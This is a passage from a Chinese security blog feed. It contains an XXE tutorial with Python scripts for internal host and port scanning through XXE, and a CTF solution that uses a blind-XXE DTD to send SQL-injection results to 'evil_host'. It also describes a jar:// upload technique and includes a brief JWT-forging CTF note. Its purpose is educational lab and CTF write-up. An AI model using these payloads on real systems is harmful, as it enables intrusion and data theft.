其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><h4 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a>新的利用：</h4><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p><p><strong>如图所示:</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/QsNmhnD.png" alt=""></p><p>PHP在安装扩展以后还能支持的协议：</p><p><strong>如图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/yagSMz8.png" alt=""></p><p><strong>注意：</strong></p><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br>update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p><h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a>实验三：HTTP 内网主机探测</h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p><p><strong>下面是一个探测脚本的实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;&#x2F;stuff&gt;</span><br><span class="line">#&lt;&#x2F;xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125;</span><br><span class="line">    x &#x3D; requests.post(&#39;http:&#x2F;&#x2F;34.200.157.128&#x2F;CUSTOM&#x2F;NEW_XEE.php&#39;, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text</span><br><span class="line">    coded_string &#x3D; x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i &#x3D; str(i)</span><br><span class="line">        ip &#x3D; &#39;10.0.0.&#39; + i</span><br><span class="line">        string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p><strong>返回结果：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/iqZlZdf.png" alt=""></p><h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a>实验四：HTTP 内网主机端口扫描</h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p><p><strong>比如我们传入：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure><p><strong>返回结果：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████: Connection refused</span><br></pre></td></tr></table></figure><p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p><p><strong>如下图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/HpfpmxB.png" alt=""></p><p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p><h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a><strong>实验五：内网盲注(CTF)</strong></h3><p>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p><p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p><p><strong>如图所示：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/PZigmLG.png" alt=""></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/nOLt3zk.png" alt=""></p><p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;52dandan.cc&#x2F;public_html&#x2F;config.php</span><br></pre></td></tr></table></figure><p>拿到第一部分 flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(BASEDIR, &quot;&#x2F;var&#x2F;www&#x2F;52dandan.club&#x2F;&quot;);</span><br><span class="line">define(FLAG_SIG, 1);</span><br><span class="line">define(SECRETFILE,&#39;&#x2F;var&#x2F;www&#x2F;52dandan.com&#x2F;public_html&#x2F;youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&#39;);</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法</p><p>压缩：echo file_get_contents(“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents(“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p><p>然后我们考虑内网有没有东西，我们读取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;etc&#x2F;host</span><br></pre></td></tr></table></figure><p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p><p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;39.107.33.75:33899&#x2F;common.php&#39;</span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">        &quot;name&quot;:&quot;evil_man&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;testabcdefg@gmail.com&quot;,</span><br><span class="line">        &quot;comment&quot;:&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">                &lt;!DOCTYPE root [</span><br><span class="line">                &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;evil_host&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">                %dtd;]&gt;</span><br><span class="line">                &quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,28):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">                f &#x3D; open(&#39;.&#x2F;evil.dtd&#39;,&#39;w&#39;)</span><br><span class="line">            payload2 &#x3D; &quot;&quot;&quot;&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;192.168.223.18&#x2F;test.php?shop&#x3D;3&#39;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(&#39;&#123;&#125;&#39;))then(0)else(1)end)-&#39;1&quot;&gt;</span><br><span class="line">                &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;evil_host&#x2F;?result&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">                %all;</span><br><span class="line">                %send;&quot;&quot;&quot;.format(&#39;_&#39;*i+chr(j)+&#39;_&#39;*(27-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                print &#39;test &#123;&#125;&#39;.format(chr(j))</span><br><span class="line">                r &#x3D; s.post(url,data&#x3D;data)</span><br><span class="line">                if &quot;Oti3a3LeLPdkPkqKF84xs&#x3D;&quot; in r.content and chr(j)!&#x3D;&#39;_&#39;:</span><br><span class="line">                        result +&#x3D; chr(j)</span><br><span class="line">                        print chr(j)</span><br><span class="line">                        break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure><p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p><h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p><p><strong>jar:// 协议的格式：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;host&#x2F;application.jar!&#x2F;file&#x2F;within&#x2F;the&#x2F;zip</span><br><span class="line"></span><br><span class="line">这个 ! 后面就是其需要从中解压出的文件</span><br></pre></td></tr></table></figure><p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此 phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的 phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><blockquote><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p></blockquote><p>下面是我的一些测试过程：</p><p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p><p><strong>示例代码：</strong></p><p><strong>xml_test.java</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package xml_test;</span><br><span class="line">import java.io.File;</span><br><span class="line"></span><br><span class="line">import javax.xml.parsers.DocumentBuilder;</span><br><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"></span><br><span class="line">import org.w3c.dom.Attr;</span><br><span class="line">import org.w3c.dom.Comment;</span><br><span class="line">import org.w3c.dom.Document;</span><br><span class="line">import org.w3c.dom.Element;</span><br><span class="line">import org.w3c.dom.NamedNodeMap;</span><br><span class="line">import org.w3c.dom.Node;</span><br><span class="line">import org.w3c.dom.NodeList;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上</span><br><span class="line"> * @author zhanglong</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class xml_test</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db &#x3D; dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">        Document doc &#x3D; db.parse(new File(&quot;student.xml&quot;));</span><br><span class="line">        &#x2F;&#x2F;获得根元素结点</span><br><span class="line">        Element root &#x3D; doc.getDocumentElement();</span><br><span class="line"></span><br><span class="line">        parseElement(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void parseElement(Element element)</span><br><span class="line">    &#123;</span><br><span class="line">        String tagName &#x3D; element.getNodeName();</span><br><span class="line"></span><br><span class="line">        NodeList children &#x3D; element.getChildNodes();</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&lt;&quot; + tagName);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断</span><br><span class="line">        NamedNodeMap map &#x3D; element.getAttributes();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;如果该元素存在属性</span><br><span class="line">        if(null !&#x3D; map)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int i &#x3D; 0; i &lt; map.getLength(); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;获得该元素的每一个属性</span><br><span class="line">                Attr attr &#x3D; (Attr)map.item(i);</span><br><span class="line"></span><br><span class="line">                String attrName &#x3D; attr.getName();</span><br><span class="line">                String attrValue &#x3D; attr.getValue();</span><br><span class="line"></span><br><span class="line">                System.out.print(&quot; &quot; + attrName + &quot;&#x3D;\&quot;&quot; + attrValue + &quot;\&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&gt;&quot;);</span><br><span class="line"></span><br><span class="line">        for(int i &#x3D; 0; i &lt; children.getLength(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            Node node &#x3D; children.item(i);</span><br><span class="line">            &#x2F;&#x2F;获得结点的类型</span><br><span class="line">            short nodeType &#x3D; node.getNodeType();</span><br><span class="line"></span><br><span class="line">            if(nodeType &#x3D;&#x3D; Node.ELEMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;是元素，继续递归</span><br><span class="line">                parseElement((Element)node);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nodeType &#x3D;&#x3D; Node.TEXT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F;递归出口</span><br><span class="line">                System.out.print(node.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line">            else if(nodeType &#x3D;&#x3D; Node.COMMENT_NODE)</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.print(&quot;&lt;!--&quot;);</span><br><span class="line"></span><br><span class="line">                Comment comment &#x3D; (Comment)node;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F;注释内容</span><br><span class="line">                String data &#x3D; comment.getData();</span><br><span class="line"></span><br><span class="line">                System.out.print(data);</span><br><span class="line"></span><br><span class="line">                System.out.print(&quot;--&gt;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(&quot;&lt;&#x2F;&quot; + tagName + &quot;&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p><p><strong>student.xml</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY  remote SYSTEM &quot;jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;wm.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;convert&gt;&amp;remote;&lt;&#x2F;convert&gt;</span><br></pre></td></tr></table></figure><p><strong>目录结构如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/SFBWxXl.png" alt=""></p><p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p><p><strong>示例代码：</strong></p><p><strong>sever.py</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys </span><br><span class="line">import time </span><br><span class="line">import threading </span><br><span class="line">import socketserver </span><br><span class="line">from urllib.parse import quote </span><br><span class="line">import http.client as httpc </span><br><span class="line"></span><br><span class="line">listen_host &#x3D; &#39;localhost&#39; </span><br><span class="line">listen_port &#x3D; 9999 </span><br><span class="line">jar_file &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">class JarRequestHandler(socketserver.BaseRequestHandler):  </span><br><span class="line">    def handle(self):</span><br><span class="line">        http_req &#x3D; b&#39;&#39;</span><br><span class="line">        print(&#39;New connection:&#39;,self.client_address)</span><br><span class="line">        while b&#39;\r\n\r\n&#39; not in http_req:</span><br><span class="line">            try:</span><br><span class="line">                http_req +&#x3D; self.request.recv(4096)</span><br><span class="line">                print(&#39;Client req:\r\n&#39;,http_req.decode())</span><br><span class="line">                jf &#x3D; open(jar_file, &#39;rb&#39;)</span><br><span class="line">                contents &#x3D; jf.read()</span><br><span class="line">                headers &#x3D; (&#39;&#39;&#39;HTTP&#x2F;1.0 200 OK\r\n&#39;&#39;&#39;</span><br><span class="line">                &#39;&#39;&#39;Content-Type: application&#x2F;java-archive\r\n\r\n&#39;&#39;&#39;)</span><br><span class="line">                self.request.sendall(headers.encode(&#39;ascii&#39;))</span><br><span class="line"></span><br><span class="line">                self.request.sendall(contents[:-1])</span><br><span class="line">                time.sleep(30)</span><br><span class="line">                print(30)</span><br><span class="line">                self.request.sendall(contents[-1:])</span><br><span class="line"></span><br><span class="line">            except Exception as e:</span><br><span class="line">                print (&quot;get error at:&quot;+str(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line"></span><br><span class="line">    jarserver &#x3D; socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) </span><br><span class="line">    print (&#39;waiting for connection...&#39;) </span><br><span class="line">    server_thread &#x3D; threading.Thread(target&#x3D;jarserver.serve_forever) </span><br><span class="line">    server_thread.daemon &#x3D; True </span><br><span class="line">    server_thread.start() </span><br><span class="line">    server_thread.join()</span><br></pre></td></tr></table></figure><p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</p><p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p><blockquote><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p></blockquote><p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar:http:&#x2F;&#x2F;localhost:9999&#x2F;jar.zip!&#x2F;1.php</span><br></pre></td></tr></table></figure><p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p><p><strong>如下图：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/u3U1EPq.png" alt=""></p><p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p><p><strong>下面是我的实验录屏：</strong></p><img src= "/img/loading.gif" data-src="https://i.imgur.com/8WMGQfV.gif"><p>实验就到这一步了，怎么利用就看各位大佬的了.</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>几个实验都是Korz3n大佬那拿来的</p><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p><p><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/6681114.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/6681114.html</a></p><p><a href="https://m3lon.github.io/2019/01/20/xxe实验踩坑记录/" target="_blank" rel="noopener">https://m3lon.github.io/2019/01/20/xxe%E5%AE%9E%E9%AA%8C%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</a></p><p><a href="https://www.jianshu.com/p/77f2181587a4" target="_blank" rel="noopener">https://www.jianshu.com/p/77f2181587a4</a></p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ISCC | 未知的风险-1</title>
      <link>http://yoursite.com/undefined/[ISCC]%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/</link>
      <guid>http://yoursite.com/undefined/[ISCC]%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/</guid>
      <pubDate>Thu, 14 May 2020 23:50:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-src=&quot;https://i.imgur.com/p3MffHP.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;进入题目：   &lt;/p&gt;
&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p><img src= "/img/loading.gif" data-src="https://i.imgur.com/p3MffHP.png" alt=""></p><p>进入题目：   </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/BCfxRDa.png" alt=""></p><p>题目提示user才能进去，抓包得到token       </p><p><img src= "/img/loading.gif" data-src="https://i.imgur.com/nJHyhmu.png" alt="">     </p><p>然后暴力破解token得到密钥进行伪造token            </p><p>攻击JWT的一些方法：       </p><p><a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p>]]></content:encoded>
      
      <comments>http://yoursite.com/undefined/[ISCC]%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-1/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
